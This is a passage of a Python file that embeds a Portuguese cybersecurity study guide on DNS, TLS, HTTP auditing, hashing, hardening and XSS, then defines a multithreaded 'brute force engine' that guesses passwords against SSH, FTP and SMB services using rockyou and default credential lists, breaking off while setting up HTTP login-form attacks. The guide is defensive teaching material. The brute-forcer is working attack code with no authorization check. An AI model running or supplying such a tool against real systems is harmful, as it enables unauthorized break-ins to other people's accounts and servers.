    ips = sorted({item[4][0] for item in resultados})
    for ip in ips:
        print(ip)
except socket.gaierror as erro:
    print("Falha na resolução DNS:", erro)

getaddrinfo() consulta endereços adequados para uma conexão. Resolução DNS bem-sucedida não garante que o serviço esteja disponível. socket também permite criar clientes e servidores TCP/UDP; sempre feche sockets e defina timeouts.

4.4 ssl — conexão TLS validada

import socket
import ssl

dominio = "example.com"
contexto = ssl.create_default_context()

try:
    with socket.create_connection((dominio, 443), timeout=5) as conexao:
        with contexto.wrap_socket(
            conexao, server_hostname=dominio
        ) as segura:
            print("TLS:", segura.version())
            print("Certificado:", segura.getpeercert())
except (OSError, ssl.SSLError) as erro:
    print("Falha TLS:", erro)

create_default_context() mantém a validação de certificados habilitada. Não desative a verificação em aplicações reais apenas para fazer uma conexão funcionar: isso pode permitir interceptação.

4.5 urllib.request, urllib.error e urlparse — HTTP e URLs

from urllib.parse import urlparse

url = "https://example.com/documentacao?pagina=1"
partes = urlparse(url)

print("Esquema:", partes.scheme)
print("Host:", partes.hostname)
print("Porta explícita:", partes.port)
print("Caminho:", partes.path)
print("Consulta:", partes.query)

import urllib.error
import urllib.request

url = "https://example.com/"
req = urllib.request.Request(
    url,
    headers={"User-Agent": "Python-Security-Lab/1.0"}
)

try:
    with urllib.request.urlopen(req, timeout=5) as resposta:
        print("Status:", resposta.status)
        print("Content-Type:", resposta.headers.get("Content-Type"))
        conteudo = resposta.read(500)
        print("Primeiros bytes:", conteudo[:100])
except urllib.error.HTTPError as erro:
    print("Erro HTTP:", erro.code)
except urllib.error.URLError as erro:
    print("Falha na URL/rede:", erro.reason)
except TimeoutError:
    print("Tempo limite excedido")

Não aceite URLs arbitrárias de usuários sem controles. Um serviço que busca URLs pode ser abusado para alcançar localhost, redes privadas ou serviços de metadados (SSRF). Considere bloquear destinos não autorizados, validar todos os endereços resolvidos, controlar redirecionamentos e aplicar restrições de rede.

4.6 json — ler e salvar relatórios

import json

relatorio = {
    "ferramenta": "Auditoria Python",
    "status": "concluido",
    "autorizado": True
}

with open("relatorio.json", "w", encoding="utf-8") as arquivo:
    json.dump(relatorio, arquivo, indent=4, ensure_ascii=False)

with open("relatorio.json", encoding="utf-8") as arquivo:
    dados = json.load(arquivo)

print(dados["status"])

JSON é um formato de dados, não um formato seguro por si só. Valide valores antes de usá-los em caminhos, comandos ou consultas.

4.7 secrets, random e string — aleatoriedade

import secrets
import string
import random

alfabeto = string.ascii_letters + string.digits
token = "".join(secrets.choice(alfabeto) for _ in range(32))
print("Token de demonstração:", token)

numero_de_teste = random.randint(1, 100)
print("Número de simulação:", numero_de_teste)

Use secrets para tokens e valores de segurança; random é para simulações e usos não criptográficos. Não registre tokens reais em logs. Para um token hexadecimal, secrets.token_hex(32) gera 32 bytes aleatórios representados por 64 caracteres hexadecimais.

4.8 hashlib — hashes e integridade

import hashlib

mensagem = b"arquivo de teste"
print(hashlib.sha256(mensagem).hexdigest())

def calcular_sha256(caminho):
    digest = hashlib.sha256()
    with open(caminho, "rb") as arquivo:
        for bloco in iter(lambda: arquivo.read(65536), b""):
            digest.update(bloco)
    return digest.hexdigest()

print(calcular_sha256("relatorio.json"))

SHA-256 é útil para integridade e identificação. Hash não é criptografia reversível. Não armazene senhas com SHA-256 simples; use Argon2id, scrypt ou PBKDF2 com salt e parâmetros apropriados.

4.9 base64 — codificação

import base64

mensagem = "Laboratório de segurança"
codificado = base64.b64encode(mensagem.encode("utf-8"))
original = base64.b64decode(codificado).decode("utf-8")

print(codificado.decode("ascii"))
print(original)

Base64 não cifra nem protege segredos. É apenas uma forma de representar bytes como texto.

4.10 os, sys e platform — ambiente e arquivos

import os
import sys
import platform

print("Diretório:", os.getcwd())
print("Usuário:", os.environ.get("USER", "desconhecido"))
print("Python:", sys.version)
print("Executável:", sys.executable)
print("Sistema:", platform.system())
print("Arquitetura:", platform.machine())

Variáveis de ambiente podem conter credenciais. Evite imprimir todas as variáveis em logs. Para caminhos de arquivos, prefira pathlib em projetos novos e valide se o caminho está dentro do diretório autorizado.

4.11 subprocess — executar programas com segurança

import subprocess
import sys

resultado = subprocess.run(
    [sys.executable, "--version"],
    capture_output=True,
    text=True,
    timeout=5,
    check=False
)

print(resultado.stdout or resultado.stderr)
print("Código de saída:", resultado.returncode)

Passe o programa e seus argumentos em uma lista.

Evite shell=True quando houver entrada externa.

Defina timeout e trate falhas.

Não execute comandos desconhecidos com sudo.

Não construa comandos concatenando texto fornecido por usuários.

4.12 threading — tarefas concorrentes

import threading
import time

def tarefa():
    print("Tarefa iniciada")
    time.sleep(1)
    print("Tarefa finalizada")

thread = threading.Thread(target=tarefa)
thread.start()
print("O programa continua")
thread.join()
print("Tarefa concluída")

Threads podem ajudar em operações de I/O. Limite a concorrência e proteja recursos compartilhados quando várias threads alterarem os mesmos dados.

4.13 http.server e socketserver — servidor local

from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

PASTA = Path("./arquivos_teste").resolve()
PASTA.mkdir(exist_ok=True)

handler = partial(SimpleHTTPRequestHandler, directory=str(PASTA))
servidor = ThreadingHTTPServer(("127.0.0.1", 8000), handler)

print("Servidor local: http://127.0.0.1:8000")
try:
    servidor.serve_forever()
except KeyboardInterrupt:
    print("\nEncerrando...")
finally:
    servidor.server_close()

Esse exemplo compartilha somente a pasta arquivos_teste configurada no código e escuta em loopback. Ainda assim, não o use como servidor de produção: o servidor padrão é destinado a desenvolvimento e testes.

4.14 textwrap — formatar mensagens

import textwrap

texto = "Cibersegurança exige estudo, autorização e registro dos testes."
print(textwrap.fill(texto, width=50))

4.15 phonenumbers — números internacionais

Instalação: python -m pip install phonenumbers. A biblioteca interpreta metadados de numeração; não revela GPS, endereço residencial nem a localização atual de uma pessoa.

import phonenumbers
from phonenumbers import geocoder, carrier

numero = phonenumbers.parse("+351 927 317 466", None)

print("Possível:", phonenumbers.is_possible_number(numero))
print("Válido segundo os metadados:", phonenumbers.is_valid_number(numero))
print("Formato internacional:", phonenumbers.format_number(
    numero, phonenumbers.PhoneNumberFormat.INTERNATIONAL
))
print("Descrição regional:", geocoder.description_for_number(numero, "pt"))
print("Operadora (se disponível):", carrier.name_for_number(numero, "pt"))

A validade depende dos metadados da biblioteca e não prova que o número esteja ativo ou pertença a uma pessoa específica. Portabilidade pode tornar a informação de operadora imprecisa.

5. Projeto completo: auditoria HTTP/TLS e relatório JSON

Este protótipo combina resolução DNS, validação de formato de URL, inspeção de TLS, consulta de alguns cabeçalhos e geração de um relatório. Use apenas alvos autorizados. A versão didática não é um scanner completo nem uma garantia de segurança.

5.1 Código completo

import datetime
import hashlib
import ipaddress
import json
import socket
import ssl
import time
import urllib.error
import urllib.request
from urllib.parse import urlparse


def resolver_dominio(dominio):
    try:
        resultados = socket.getaddrinfo(
            dominio, None, type=socket.SOCK_STREAM
        )
        ips = sorted({item[4][0] for item in resultados})
        return {"enderecos": ips}
    except socket.gaierror as erro:
        return {"erro": str(erro)}


def verificar_tls(dominio, porta):
    contexto = ssl.create_default_context()
    try:
        with socket.create_connection((dominio, porta), timeout=5) as sock:
            with contexto.wrap_socket(
                sock, server_hostname=dominio
            ) as segura:
                return {
                    "conectado": True,
                    "versao": segura.version(),
                    "certificado": segura.getpeercert()
                }
    except (OSError, ssl.SSLError) as erro:
        return {"conectado": False, "erro": str(erro)}


def consultar_http(url):
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "AuditoriaDefensivaPython/1.0"}
    )
    cabecalhos_interesse = [
        "Content-Type",
        "Strict-Transport-Security",
        "Content-Security-Policy",
        "X-Content-Type-Options",
        "X-Frame-Options",
        "Referrer-Policy"
    ]
    try:
        with urllib.request.urlopen(req, timeout=8) as resposta:
            return {
                "status": resposta.status,
                "cabecalhos": {
                    nome: resposta.headers.get(nome)
                    for nome in cabecalhos_interesse
                }
            }
    except urllib.error.HTTPError as erro:
        return {"status": erro.code, "erro": "Resposta HTTP de erro"}
    except (urllib.error.URLError, TimeoutError, OSError) as erro:
        return {"erro": str(erro)}


def sha256_arquivo(caminho):
    digest = hashlib.sha256()
    with open(caminho, "rb") as arquivo:
        for bloco in iter(lambda: arquivo.read(65536), b""):
            digest.update(bloco)
    return digest.hexdigest()


def analisar_url(url):
    partes = urlparse(url)
    if partes.scheme not in ("http", "https"):
        raise ValueError("Use uma URL HTTP ou HTTPS.")
    if not partes.hostname:
        raise ValueError("A URL precisa conter um host.")
    if partes.username or partes.password:
        raise ValueError("Não inclua credenciais na URL.")
    try:
        porta = partes.port
    except ValueError:
        raise ValueError("Porta inválida.") from None

    dominio = partes.hostname
    relatorio = {
        "url": url,
        "esquema": partes.scheme,
        "dominio": dominio,
        "data_utc": datetime.datetime.now(
            datetime.timezone.utc
        ).isoformat(),
        "dns": resolver_dominio(dominio)
    }

    if partes.scheme == "https":
        relatorio["tls"] = verificar_tls(dominio, porta or 443)

    relatorio["http"] = consultar_http(url)
    return relatorio


def main():
    print("=== AUDITORIA DEFENSIVA ===")
    url = input("URL autorizada: ").strip()
    inicio = time.perf_counter()

    try:
        relatorio = analisar_url(url)
        relatorio["duracao_segundos"] = round(
            time.perf_counter() - inicio, 3
        )
        print(json.dumps(relatorio, indent=2, ensure_ascii=False))
        with open("relatorio_auditoria.json", "w", encoding="utf-8") as arquivo:
            json.dump(relatorio, arquivo, indent=2, ensure_ascii=False)
        print("Relatório salvo em relatorio_auditoria.json")
    except (ValueError, OSError) as erro:
        print("Não foi possível concluir:", erro)

    caminho = input("Arquivo local para SHA-256 (Enter para pular): ").strip()
    if caminho:
        try:
            print("SHA-256:", sha256_arquivo(caminho))
        except OSError as erro:
            print("Falha ao ler arquivo:", erro)


if __name__ == "__main__":
    main()

5.2 Executar

cd ~/cyberseguranca-python
source .venv/bin/activate
python auditoria.py

Teste com https://example.com/ ou com uma aplicação de laboratório. O script faz uma requisição ao destino informado e pode seguir redirecionamentos conforme o comportamento padrão do cliente HTTP. Não use entradas de terceiros sem validação e controles adicionais.

5.3 Interpretar os resultados

Nota técnica: para produção, a ferramenta precisa de controles robustos de SSRF, restrição de destinos, validação de DNS e redirecionamentos, limites de tamanho, logging seguro e testes automatizados. O resultado deve ser tratado como sinal inicial, não como laudo conclusivo.

6. Linux/Kali: verificações defensivas

whoami
id
uname -a
ip address
ip route
ss -lnt

sudo apt update
apt list --upgradable

O primeiro comando atualiza os índices de pacotes; o segundo lista atualizações disponíveis. Revise mudanças e faça backup antes de atualizar sistemas críticos.

6.1 Checklist de hardening

Trabalhe sem privilégios administrativos por padrão.

Mantenha sistema e aplicações atualizados.

Desative serviços que não são necessários.

Limite serviços de rede a interfaces e origens necessárias.

Use autenticação multifator quando possível.

Proteja backups e teste a restauração.

Revise permissões de arquivos e diretórios.

Guarde segredos em mecanismos apropriados, não no código-fonte.

Monitore logs e investigue eventos incomuns.

Não execute scripts desconhecidos com sudo.

7. Criptografia, hashes e credenciais

7.1 Não confunda os conceitos

7.2 Boas práticas para senhas e tokens

Nunca armazene senhas em texto puro.

Use uma função apropriada para senhas com salt e parâmetros atuais.

Gere tokens com secrets, não com random.

Defina expiração e revogação de tokens.

Não inclua segredos em logs, prints, capturas de tela ou repositórios.

Rotacione credenciais expostas e revise onde foram usadas.

AES-GCM é um modo de criptografia autenticada: além da confidencialidade, detecta alterações nos dados. A segurança depende de implementação correta, gerenciamento de chaves e, em particular, de não reutilizar um nonce com a mesma chave.

8. Segurança web e APIs

8.1 Controles básicos

Autenticação: confirmar a identidade de quem acessa.

Autorização: verificar se essa identidade pode executar a ação.

Validação: verificar formato, tamanho, tipo e contexto dos dados.

Limitação de taxa: reduzir abuso e consumo excessivo de recursos.

Tratamento de erros: evitar expor stack traces, segredos e detalhes internos.

Transporte seguro: usar HTTPS/TLS com validação adequada.

Logs: registrar eventos úteis sem armazenar senhas ou tokens.

Dependências: atualizar bibliotecas e acompanhar avisos de segurança.

8.2 Validação de entrada em Python

def validar_idade(valor):
    try:
        idade = int(valor)
    except (ValueError, TypeError):
        return False
    return 0 <= idade <= 120

print(validar_idade("18"))     # True
print(validar_idade("texto"))  # False
print(validar_idade("-5"))     # False

Validação não substitui autorização. Uma API também precisa garantir que um usuário só acesse os registros que lhe pertencem e que cada operação seja permitida.

8.3 Arquivos e caminhos

Não confie em nomes de arquivo fornecidos por usuários. Restringir extensões não basta: valide o destino real, mantenha os arquivos dentro de uma pasta autorizada, controle permissões e evite seguir caminhos que escapem do diretório previsto.

9. Logs e resposta a incidentes

Logs ajudam a reconstruir eventos, identificar falhas e detectar atividades suspeitas. Um log útil registra horário com fuso, evento, resultado e identificador de correlação, sem expor senhas, tokens ou dados pessoais desnecessários.

9.1 Processo inicial de resposta

Identificar o evento e registrar quando foi percebido.

Preservar evidências e evitar alterações desnecessárias.

Conter o problema de forma proporcional e autorizada.

Investigar a causa e o alcance com registros confiáveis.

Erradicar a causa, aplicar correções e recuperar o serviço.

Documentar as lições aprendidas e melhorar os controles.

Se houver um incidente real, siga o plano da organização e envolva os responsáveis. Não apague logs nem faça mudanças que possam destruir evidências sem orientação.

10. Laboratórios e referências

Utilize os laboratórios conforme os termos e regras de cada plataforma. Não reproduza testes em sistemas externos sem autorização explícita.

11. Plano de estudo sugerido

12. Exercícios

Use ipaddress para validar um IPv4 e um IPv6; trate ValueError.

Explique por que resolver um domínio não prova que o serviço está acessível.

Calcule o SHA-256 de um arquivo próprio e repita após modificá-lo. Compare os resultados.

Gere um token com secrets e explique por que random não é adequado para autenticação.

Consulte os cabeçalhos de uma aplicação de laboratório e explique por que a ausência de um cabeçalho não prova sozinha uma vulnerabilidade.

Altere o projeto para registrar a duração e a data UTC de cada análise.

Crie uma lista de permissões de domínios para que seu laboratório só aceite destinos previamente aprovados.

13. Glossário

Conclusão

Aprender cibersegurança é um processo contínuo. Para cada conceito, escreva um pequeno programa, execute-o em laboratório, leia os resultados e documente limites e possíveis erros. O objetivo é compreender o que a ferramenta realmente comprova — e o que ela não comprova — para tomar decisões seguras.

Regra de ouro: autorização, escopo, segurança dos dados e documentação fazem parte do trabalho técnico, não são detalhes opcionais.

12. HTML e segurança de páginas web

HTML (HyperText Markup Language) é a linguagem de marcação usada para estruturar o conteúdo de páginas web. Ele organiza títulos, parágrafos, links, imagens, formulários, tabelas e outras partes da página. HTML não é, por si só, uma linguagem de programação: ele descreve a estrutura do conteúdo. CSS controla a apresentação visual, e JavaScript adiciona comportamento e interatividade.

12.1 Estrutura básica de um documento HTML

Exemplo simples (salve como index.html e abra no navegador):

<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Minha página de teste</title>
</head>
<body>
  <h1>Olá, mundo!</h1>
  <p>Esta é uma página HTML para estudar em laboratório.</p>
  <a href="https://example.com">Visitar um exemplo</a>
</body>
</html>

12.2 Tags HTML mais comuns

<html>: elemento raiz do documento.

<head>: metadados, título e configurações que não são o conteúdo principal visível.

<meta charset="utf-8">: declara a codificação de caracteres.

<title>: título mostrado na aba do navegador.

<body>: conteúdo principal da página.

<h1> a <h6>: títulos em diferentes níveis.

<p>: parágrafo.

<a href="...">: link para outra página ou recurso.

<ul>, <ol> e <li>: listas não ordenadas, ordenadas e itens.

<form>, <label>, <input> e <button>: elementos de formulários.

<div> e <span>: contêineres genéricos, usados quando não há um elemento semântico mais adequado.

<script>: inclui ou referencia JavaScript; use com cuidado e evite inserir código não confiável.

12.3 HTML e cibersegurança

HTML ajuda quem estuda segurança a entender como o navegador apresenta conteúdo e formulários. Ao inspecionar uma página, verifique se os campos têm rótulos claros, se os links apontam para destinos esperados e se a página não tenta induzir o usuário a fornecer dados sensíveis. A aparência de uma página pode ser copiada; confira o domínio e não confie apenas no logotipo, nas cores ou no cadeado do navegador.

HTML sozinho não protege dados enviados por formulários. A aplicação do servidor deve validar os dados, controlar permissões e evitar registrar senhas ou tokens em logs. Informações sensíveis devem ser transmitidas por HTTPS, mas HTTPS não prova que um site é honesto: ele protege a conexão com o domínio acessado.

12.4 Formulários seguros

<form action="/contato" method="post">
  <label for="email">E-mail:</label>
  <input id="email" name="email" type="email" autocomplete="email" required>
  <button type="submit">Enviar</button>
</form>

O atributo required oferece uma validação básica no navegador, mas não substitui a validação no servidor. O servidor precisa tratar qualquer entrada como não confiável, validar formato e tamanho, aplicar limites de uso quando apropriado e armazenar apenas o necessário. Não coloque senhas, chaves de API ou tokens dentro do HTML enviado ao navegador.

12.5 Segurança contra XSS

Cross-Site Scripting (XSS) ocorre quando uma aplicação inclui conteúdo não confiável em uma página de forma que o navegador o interprete como código. A defesa depende do contexto: escape/encode de saída apropriado, APIs seguras de manipulação do DOM, evitar inserir texto não confiável como HTML e aplicar uma Content Security Policy (CSP) bem planejada. Não confie em filtros improvisados como única defesa.

// Preferível para mostrar texto fornecido pelo usuário:
element.textContent = textoDoUsuario;

// Evite inserir conteúdo não confiável como HTML:
element.innerHTML = textoDoUsuario; // pode ser perigoso

12.6 Cabeçalhos HTTP úteis

Content-Security-Policy (CSP): limita de onde certos recursos podem ser carregados e reduz algumas classes de risco.

Strict-Transport-Security (HSTS): orienta navegadores compatíveis a usar HTTPS para o domínio por um período definido.

X-Content-Type-Options: nosniff: reduz interpretações indevidas de tipos de conteúdo.

Referrer-Policy: controla quanto da informação de referência é enviada a outros sites.

Permissions-Policy: permite limitar o uso de determinados recursos do navegador.

A configuração correta depende da aplicação. Teste mudanças em ambiente de desenvolvimento e confira se elas não quebram funcionalidades legítimas.

12.7 Ler HTML com Python

Para projetos próprios ou páginas públicas que você tem autorização para analisar, Python pode buscar uma página e extrair informações. A biblioteca padrão permite baixar conteúdo HTTP; para interpretar HTML com mais facilidade, é comum usar Beautiful Soup, instalada separadamente.

from urllib.request import Request, urlopen
from urllib.parse import urlparse

url = "https://example.com"
parsed = urlparse(url)

if parsed.scheme != "https" or not parsed.netloc:
    raise ValueError("Use uma URL HTTPS válida")

req = Request(url, headers={"User-Agent": "Estudo-Ciberseguranca/1.0"})
with urlopen(req, timeout=10) as response:
    html = response.read(500_000).decode("utf-8", errors="replace")
    print("Status:", response.status)
    print("Content-Type:", response.headers.get("Content-Type"))
    print("HTML recebido (início):")
    print(html[:1000])

Use apenas em alvos permitidos, respeite os termos do serviço, limite requisições e não tente contornar autenticação ou controles de acesso. O exemplo limita a leitura a 500 mil bytes para evitar consumir conteúdo ilimitado.

12.8 Checklist de revisão de uma página

O domínio está escrito corretamente e corresponde ao site esperado?

A página usa HTTPS e não apresenta erros de certificado?

O formulário explica quais dados são necessários e por quê?

A aplicação valida entradas também no servidor?

Dados sensíveis ficam fora do HTML público, do JavaScript entregue ao navegador e dos logs?

O conteúdo fornecido por usuários é exibido como texto seguro e não executado como HTML?

Os cabeçalhos de segurança foram configurados e testados?

Há política de privacidade e coleta mínima de dados?

13. Projeto prático: página HTML local para estudo

Crie uma pasta chamada html-lab e salve o código HTML da seção 12.1 como index.html. Abra o arquivo no navegador. Depois, altere o título, acrescente uma lista e crie um formulário que não envie dados a um servidor real. Use as ferramentas de desenvolvedor do navegador para inspecionar a estrutura. Não use dados pessoais reais nos testes.

Princípio | Significado | Exemplo

Confidencialidade | Somente pessoas autorizadas acessam os dados. | Criptografar um backup.

Integridade | Os dados não são alterados sem autorização. | Comparar o SHA-256 de um arquivo.

Disponibilidade | Sistemas e dados estão acessíveis quando necessários. | Backups testados e redundância.

Termo | Definição | Exemplo

Ativo | Recurso que precisa ser protegido. | Servidor, conta ou base de dados.

Ameaça | Evento ou agente capaz de causar dano. | Phishing, falha elétrica ou malware.

Vulnerabilidade | Fraqueza que pode ser explorada. | Biblioteca desatualizada.

Risco | Combinação de probabilidade e impacto. | Exposição de dados pessoais.

Mitigação | Medida que reduz o risco. | Corrigir, restringir acesso ou monitorar.

Hardening | Redução da superfície de ataque. | Desativar serviços desnecessários.

Pentest | Teste de segurança com autorização e escopo. | Avaliar uma aplicação de laboratório.

Porta | Serviço | Uso típico

22/TCP | SSH | Administração remota segura.

53/TCP/UDP | DNS | Resolução de nomes.

80/TCP | HTTP | Web sem TLS.

443/TCP | HTTPS | Web protegida por TLS.

445/TCP | SMB | Compartilhamento em redes Windows.

3306/TCP | MySQL | Banco de dados.

8000/TCP | Variável | Servidor de desenvolvimento em alguns projetos.

Campo | O que significa | O que não prova

DNS | O nome foi resolvido em endereços. | Que o serviço está disponível ou é confiável.

TLS | A negociação TLS passou pela validação padrão. | Que a aplicação não possui vulnerabilidades.

Status HTTP | Código de resposta recebido. | Que o conteúdo é seguro.

Cabeçalhos | Cabeçalhos observados na resposta. | Que sua ausência, isoladamente, é uma vulnerabilidade confirmada.

SHA-256 | Resumo do arquivo naquele momento. | Que o arquivo é seguro ou confiável sem uma referência de comparação.

Comando | Uso

whoami | Mostra o usuário atual.

id | Mostra UID, GID e grupos.

uname -a | Exibe informações do kernel.

ip address | Mostra interfaces e endereços.

ip route | Mostra a tabela de rotas.

ss -lnt | Mostra sockets TCP em escuta.

Técnica | Objetivo | Exemplo

Codificação | Representar dados em outro formato. | Base64.

Hash | Gerar um resumo para comparação. | SHA-256.

Criptografia | Proteger conteúdo usando chave. | AES-GCM.

Hash de senha | Armazenar verificadores resistentes a tentativas. | Argon2id, scrypt ou PBKDF2.

Recurso | O que estudar | Endereço

Documentação Python | Módulos, sintaxe, exceções e biblioteca padrão. | https://docs.python.org/3/

OWASP | Guias e projetos de segurança de aplicações. | https://owasp.org/

OWASP Juice Shop | Aplicação deliberadamente vulnerável para laboratório. | https://owasp.org/www-project-juice-shop/

Web Security Academy | Laboratórios guiados de segurança web. | https://portswigger.net/web-security

OverTheWire Bandit | Terminal Linux e fundamentos. | https://overthewire.org/wargames/bandit/

NIST Cybersecurity Framework | Gestão de riscos de cibersegurança. | https://www.nist.gov/cyberframework

MITRE ATT&CK | Táticas e técnicas observadas de adversários. | https://attack.mitre.org/

Etapa | Tópicos | Projeto de prática

1. Fundamentos | Python básico, funções, arquivos e exceções. | Validador de entrada e relatório JSON.

2. Redes | IP, DNS, TCP/UDP, HTTP e TLS. | Consulta DNS e diagnóstico TLS.

3. Integridade | Hash, arquivos, datas e logs. | Inventário de hashes de arquivos próprios.

4. Linux | Permissões, processos, serviços e atualizações. | Checklist de hardening da própria máquina.

5. Segurança web | Sessões, autorização, validação e cabeçalhos. | Aplicação local de laboratório e relatório.

6. Resposta | Logs, evidências e documentação. | Relatório de incidente simulado.

Termo | Definição

API | Interface que permite a sistemas trocarem dados e operações.

CVE | Identificador público de uma vulnerabilidade conhecida.

CVSS | Sistema de pontuação de severidade de vulnerabilidades.

Firewall | Controle de tráfego baseado em regras.

IOC | Indicador de comprometimento, como hash, domínio ou endereço IP associado a uma investigação.

Log | Registro de eventos.

MFA | Autenticação multifator.

Patch | Atualização que corrige falhas ou problemas.

SSRF | Falha em que uma aplicação pode ser induzida a fazer requisições a destinos não pretendidos.

TLS | Protocolo que protege comunicações em rede.

Pentest | Teste autorizado de segurança com escopo definido.
''')

def brute_force():
    import concurrent.futures
    import threading
    import time
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import hashlib
    import re
    import os
    import json

    print("\n" + "="*50)
    print(" 🗝️ THECELTIC BRUTE FORCE ENGINE [PRODUCTION]")
    print("="*50)
    print("""
    [1] SSH Brute Force
    [2] FTP Brute Force
    [3] SMB Brute Force
    [4] HTTP Form Brute Force (Universal/Smart)
    [5] Gerador de Wordlist (Combinação)
    [0] Voltar ao Menu
    """)
    
    # --- ESTADO GLOBAL DA SESSÃO ---
    stats = {"total": 0, "success": 0, "errors": 0}
    stop_event = threading.Event()
    lock = threading.Lock()
    start_time = time.time()
    
    def update_stats(key, increment=1):
        with lock:
            stats[key] += increment

    def report_metrics():
        with lock:
            total = stats["total"]
            success = stats["success"]
            errors = stats["errors"]
        if total == 0: 
            return
        elapsed = time.time() - start_time
        rate = total / elapsed if elapsed > 0 else 0
        print(f"\r[PROGRESS] {total} testados | {success} OK | {errors} ERR | {rate:.2f} req/s", end="", flush=True)

    def get_wordlist_content():
        DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
        print("\n[INFO] Opções de Wordlist:")
        print("[1] Usar /usr/share/wordlists/rockyou.txt (Completo)")
        print("[2] Informar senhas manualmente (separadas por vírgula)")
        print("[3] Wordlist padrão curta (Top 20 comuns)")
        print("[4] Carregar arquivo .txt personalizado")
        
        choice = input("Escolha (1-4): ").strip()
        
        if choice == '1' and os.path.exists(DEFAULT_WORDLIST):
            print("[INFO] Carregando RockYou em memória...")
            with open(DEFAULT_WORDLIST, 'r', encoding='utf-8', errors='ignore') as f:
                return list(set(line.strip() for line in f if line.strip()))
        elif choice == '2':
            raw = input("Digite as senhas (separadas por vírgula): ").strip()
            return [s.strip() for s in raw.split(',') if s.strip()]
        elif choice == '4':
            file_path = input("Caminho do arquivo .txt: ").strip()
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    return list(set(line.strip() for line in f if line.strip()))
            else:
                print("[ERRO] Arquivo não encontrado. Usando lista padrão.")
                return ["admin", "root", "user", "password", "123456", "letmein", "welcome", "monkey", "dragon", "master", "123456789", "12345678"]
        else:
            return ["admin", "root", "user", "password", "123456", "letmein", "welcome", "monkey", "dragon", "master", "123456789", "12345678"]

    def run_parallel_attack(candidates, test_func, service_name, max_workers=20):
        global start_time
        start_time = time.time()
        total_candidates = len(candidates)
        print(f"[INFO] Inicializando {service_name} Brute Force...")
        print(f"[INFO] Total de combinações: {total_candidates}")
        
        if total_candidates == 0:
            print("[!] Nenhuma combinação para testar.")
            return []

        results = []
        last_error_check = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            for i in range(0, total_candidates, 500):
                if stop_event.is_set():
                    break
                
                batch = candidates[i:i+500]
                futures = {executor.submit(test_func, cand): cand for cand in batch}
                
                for future in concurrent.futures.as_completed(futures):
                    if stop_event.is_set():
                        break
                    candidate = futures[future]
                    try:
                        result = future.result()
                        if result:
                            update_stats("success")
                            results.append(result)
                            print(f"\n{GREEN}[SUCESSO]{RESET} {service_name} - Usuário: {result['user']} | Senha: {result['password']}")
                            stop_event.set()
                            break
                    except Exception as e:
                        update_stats("errors")
                        with lock:
                            if stats["errors"] % 100 == 0:
                                print(f"\n[WARN] {stats['errors']} erros. Último: {type(e).__name__}: {str(e)[:50]}")
                    finally:
                        update_stats("total")
                        report_metrics()
                        
                        if time.time() - last_error_check > 5:
                            with lock:
                                error_ratio = stats["errors"] / max(stats["total"], 1)
                            if error_ratio > 0.5:
                                time.sleep(0.1)
                            last_error_check = time.time()

        print("\n" + "="*30)
        print(f"RESUMO FINAL ({service_name})")
        print(f"Testados: {stats['total']}")
        print(f"Sucessos: {stats['success']}")
        print(f"Erros: {stats['errors']}")
        if results:
            print("Credenciais Válidas:")
            for r in results:
                print(f"  {r['user']} : {r['password']}")
        else:
            print("Nenhuma credencial válida encontrada.")
        print("="*30)
        return results

    try:
        sub_op = int(input("Escolha um serviço: "))
        
        if sub_op == 0:
            return

        users_input = input("Usuários (separados por vírgula, ENTER para padrão): ").strip() or "root,admin,user,test,administrator,ftp,anonymous"
        users = [u.strip() for u in users_input.split(',') if u.strip()]
        passwords = get_wordlist_content()
        
        if not users or not passwords:
            print("[!] Usuários ou senhas vazios.")
            return

        if len(users) * len(passwords) > 1000000:
            print("[WARN] Combinações muito grandes.")
            confirm = input("Continuar mesmo assim? (s/n): ").lower()
            if confirm != 's':
                return

        candidates = [{"user": u, "password": p} for u in users for p in passwords]

        if sub_op == 1: # SSH
            target = input("Alvo (IP/Dominio): ").strip()
            if not target: return
            port = int(input("Porta SSH (ENTER para 22): ") or "22")
            
            def test_ssh(cand):
                try:
                    paramiko = import_paramiko()
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        target, port=port, username=cand['user'], password=cand['password'],
                        timeout=5, allow_agent=False, look_for_keys=False,
                        banner_timeout=5, auth_timeout=5
                    )
                    client.close()
                    return cand
                except paramiko.ssh_exception.AuthenticationException:
                    return None
                except Exception:
                    raise

            run_parallel_attack(candidates, test_ssh, "SSH", max_workers=20)

        elif sub_op == 2: # FTP
            target = input("Alvo (IP/Dominio): ").strip()
            if not target: return
            port = int(input("Porta FTP (ENTER para 21): ") or "21")
            
            def test_ftp(cand):
                try:
                    import ftplib
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=5)
                    ftp.login(cand['user'], cand['password'])
                    ftp.quit()
                    return cand
                except ftplib.error_perm:
                    return None
                except Exception:
                    raise

            run_parallel_attack(candidates, test_ftp, "FTP", max_workers=20)

        elif sub_op == 3: # SMB
            target = input("Alvo (IP/Dominio): ").strip()
            if not target: return
            port = int(input("Porta SMB (ENTER para 445): ") or "445")
            
            def test_smb(cand):
                try:
                    import smbprotocol.connection  # type: ignore
                    import smbprotocol.session     # type: ignore
                    import smbprotocol.exceptions  # type: ignore
                    
                    conn = smbprotocol.connection.Connection.create(target, port)
                    conn.connect()
                    session = smbprotocol.session.Session.create(conn, cand['user'], cand['password'])
                    session.connect()
                    session.close()
                    conn.close()
                    return cand
                    
                except ModuleNotFoundError:
                    raise ModuleNotFoundError("Biblioteca 'smbprotocol' não instalada. Rode: pip install smbprotocol")
                except Exception:
                    raise

            run_parallel_attack(candidates, test_smb, "SMB", max_workers=20)

        elif sub_op == 4: # HTTP UNIVERSAL SMART
            target = input("URL do formulário (ex: https://site.com/login): ").strip()
            if not target: return
            
            print("[INFO] Configurando Motor Smart...")
            
            user_field = input("Nome do campo HTML de usuário (ENTER para 'username'): ").strip() or "username"
            pass_field = input("Nome do campo HTML de senha (ENTER para 'password'): ").strip() or "password"
